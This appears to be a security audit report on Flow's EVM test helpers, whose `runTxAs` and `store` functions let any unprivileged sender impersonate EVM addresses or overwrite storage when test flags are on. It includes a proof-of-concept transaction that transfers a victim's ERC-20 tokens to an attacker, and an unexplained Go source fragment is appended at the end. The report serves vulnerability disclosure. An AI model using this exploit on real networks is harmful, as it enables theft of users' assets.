### Title
Unprivileged `EVM.runTxAs()` / `EVM.store()` Allow Arbitrary EVM Calls and State Mutation as Any Address - (File: `fvm/evm/stdlib/contract_test_helpers.cdc`)

---

### Summary

When the Flow EVM contract is bootstrapped with `evmTestHelpersEnabled = true` (used for the emulator and forked networks) and the FVM execution context has `EVMTestOperationsAllowed = true`, the `access(all)` functions `EVM.runTxAs()`, `EVM.store()`, and `EVM.load()` in `contract_test_helpers.cdc` are callable by any unprivileged transaction sender. `runTxAs` sets `msg.sender` to an arbitrary attacker-supplied EVM address, enabling impersonation of any EVM account and arbitrary calls to any EVM contract with any calldata. `store` allows direct overwrite of any EVM storage slot. There is no Cadence-level access control on these functions — the only protection is a Go-level runtime flag check that is intentionally disabled for emulator/forked-network use cases.

---

### Finding Description

`contract_test_helpers.cdc` defines three functions that are injected into the live EVM Cadence contract when `evmTestHelpersEnabled = true`:

```cadence
// fvm/evm/stdlib/contract_test_helpers.cdc
access(all)
fun runTxAs(
    from: EVM.EVMAddress,
    to: EVM.EVMAddress,
    data: [UInt8],
    gasLimit: UInt64,
    value: EVM.Balance,
): Result {
    return InternalEVM.runTxAs(
        from: from.bytes,
        to: to.bytes,
        data: data,
        gasLimit: gasLimit,
        value: value.attoflow
    ) as! Result
}

access(all)
fun store(target: EVM.EVMAddress, slot: String, value: String) { ... }

access(all)
view fun load(target: EVM.EVMAddress, slot: String): [UInt8] { ... }
```

All three are `access(all)` — any Cadence transaction can call them with no entitlement or account-ownership check.

The sole protection is a Go-level runtime guard in `ContractHandler.validateTestOperation()`:

```go
// fvm/evm/handler/handler.go
func (h *ContractHandler) validateTestOperation() {
    if !h.backend.EVMTestOperationsAllowed() {
        panicOnError(types.ErrUnsupportedOperation)
    }
}
```

`RunTxAs` calls this guard and then calls `AccountByAddress(from, true)` — granting full authorization to the attacker-supplied `from` address — and executes the call:

```go
// fvm/evm/handler/handler.go
func (h *ContractHandler) RunTxAs(...) *types.ResultSummary {
    h.validateTestOperation()
    account := h.AccountByAddress(from, true)
    return account.Call(to, txData, gasLimit, balance)
}
```

The `isAuthorized = true` flag is what normally distinguishes a COA owner's call from an unauthorized call. Here it is unconditionally set to `true` for any attacker-supplied `from` address.

The two enabling conditions are:
1. **Bootstrap-time**: `evmTestHelpersEnabled = true` injects the functions into the live EVM contract via `ContractCode()`.
2. **Runtime**: `EVMTestOperationsAllowed = true` in the FVM context allows the Go guard to pass.

Both are explicitly supported for the Flow Emulator and forked networks. The `WithEVMTestHelpersEnabled` bootstrap option and `WithEVMTestOperationsAllowed` context option are production code paths, not test-only scaffolding.

---

### Impact Explanation

When both flags are active (emulator, forked mainnet/testnet for debugging, or any network where an operator enables them):

- **`runTxAs`**: Any unprivileged transaction sender can impersonate any EVM address (`msg.sender = victim`) and call any EVM contract with arbitrary calldata. This enables: draining ERC-20 balances, calling `transfer`/`transferFrom` as a victim, invoking privileged contract functions that check `msg.sender`, and stealing any EVM-side asset.
- **`store`**: Any unprivileged transaction sender can overwrite any EVM storage slot of any contract or EOA — directly falsifying ERC-20 balances, ownership mappings, or any on-chain state.

The impact is **cross-VM asset loss** and **unauthorized EVM account mutation** for any EVM address on the network.

---

### Likelihood Explanation

The Flow Emulator is a production-distributed tool used by developers and dApp teams. Forked networks are used for protocol upgrades and incident response. Both scenarios legitimately enable `evmTestHelpersEnabled = true`. If `EVMTestOperationsAllowed` is also enabled (as it is in emulator test runs), any user with transaction submission access to that network can exploit this. The attack requires no special privileges, no leaked keys, and no social engineering — only the ability to submit a Cadence transaction.

---

### Recommendation

1. Replace `access(all)` on `runTxAs`, `store`, and `load` in `contract_test_helpers.cdc` with a Cadence entitlement that is never publicly issuable (e.g., `access(EVMTestOps)` where `EVMTestOps` is an entitlement only the service account can grant), so that even if the functions are compiled into the contract, no unprivileged caller can invoke them.
2. Alternatively, restrict these functions to `access(contract)` or require the caller to hold a specific admin capability stored in the service account.
3. Document clearly that enabling `evmTestHelpersEnabled = true` on any network with untrusted transaction senders is a critical security risk.

---

### Proof of Concept

On any network bootstrapped with `evmTestHelpersEnabled = true` and execution context `EVMTestOperationsAllowed = true`, submit:

```cadence
import EVM from <EVMContractAddress>

transaction {
    prepare(attacker: &Account) {
        // Impersonate victim's EVM address
        let victimAddr = EVM.addressFromString("0xVICTIM_EVM_ADDRESS")
        let tokenContract = EVM.addressFromString("0xERC20_TOKEN_CONTRACT")

        // Encode ERC-20 transfer(to, amount) calldata
        let calldata = EVM.encodeABIWithSignature(
            "transfer(address,uint256)",
            [EVM.addressFromString("0xATTACKER_EVM_ADDRESS"), UInt256(1_000_000)]
        )

        // Call as victim — msg.sender = victimAddr
        let result = EVM.runTxAs(
            from: victimAddr,
            to: tokenContract,
            data: calldata,
            gasLimit: 100_000,
            value: EVM.Balance(attoflow: 0)
        )
        assert(result.status == EVM.Status.successful, message: result.errorMessage)
    }
}
```

This transfers ERC-20 tokens from the victim's EVM address to the attacker's address without any authorization from the victim.

var flowTokenImportPattern = regexp.MustCompile(`(?m)^import "FlowToken"`)
var loadTestHelpersPattern = regexp.MustCompile(`(?m)\/\/ #loadTestHelpers`)

func ContractCode(
	nonFungibleTokenAddress,
	fungibleTokenAddress,
	flowTokenAddress flow.Address,
	evmTestHelpersEnabled bool,
) []byte {
	evmContract := nftImportPattern.ReplaceAllString(
		contractCode,
		fmt.Sprintf("import NonFungibleToken from %s", nonFungibleTokenAddress.HexWithPrefix()),
	)
	evmContract = fungibleTokenImportPattern.ReplaceAllString(
		evmContract,
		fmt.Sprintf("import FungibleToken from %s", fungibleTokenAddress.HexWithPrefix()),
	)
	evmContract = flowTokenImportPattern.ReplaceAllString(
		evmContract,
		fmt.Sprintf("import FlowToken from %s", flowTokenAddress.HexWithPrefix()),
	)

	// Inject the contract_test_helpers.cdc code, only if the
	// bootstrapping option was specified.
	if evmTestHelpersEnabled {
		replaced := loadTestHelpersPattern.ReplaceAllLiteralString(
			evmContract,
			contractTestHelpers,
		)
		if replaced == evmContract {
			panic("missing // `#loadTestHelpers` marker in contract.cdc")
		}
		evmContract = replaced
	}

	return []byte(evmContract)
